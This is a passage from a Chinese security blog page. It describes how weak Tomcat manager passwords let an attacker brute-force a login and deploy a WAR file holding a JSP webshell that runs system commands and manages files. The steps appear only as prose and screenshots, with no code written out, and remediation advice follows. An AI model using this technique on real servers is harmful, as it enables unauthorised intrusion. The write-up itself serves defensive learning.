<h3 id="（三）war后门文件部署"><a href="#（三）war后门文件部署" class="headerlink" title="（三）war后门文件部署"></a>（三）war后门文件部署</h3><p><strong>1、漏洞简介及成因</strong></p>
<p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
<p><strong>2、漏洞复现</strong></p>
<p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p>
<p><a href="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png!small" alt="img"></a></p>
<p>访问后台，登陆：</p>
<p><a href="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png!small" alt="img"></a></p>
<p>上传一个war包，里面是jsp后门：</p>
<p><a href="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png!small" alt="img"></a></p>
<p>成功上传并解析，打开：</p>
<p><a href="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png!small" alt="img"></a></p>
<p>可执行系统命令：</p>
<p><a href="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png!small" alt="img"></a></p>
<p>也可进行文件管理，任意查看、删除、上传文件：</p>
<p><a href="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png!small" alt="img"></a></p>
<p><strong>3、漏洞修复</strong></p>
<p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p>
<p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p>
<p>4）后台管理避免弱口令。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="Shu1L" />
            
              <p class="site-author-name" itemprop="name">Shu1L</p>
              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">40</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">28</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shu1L</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
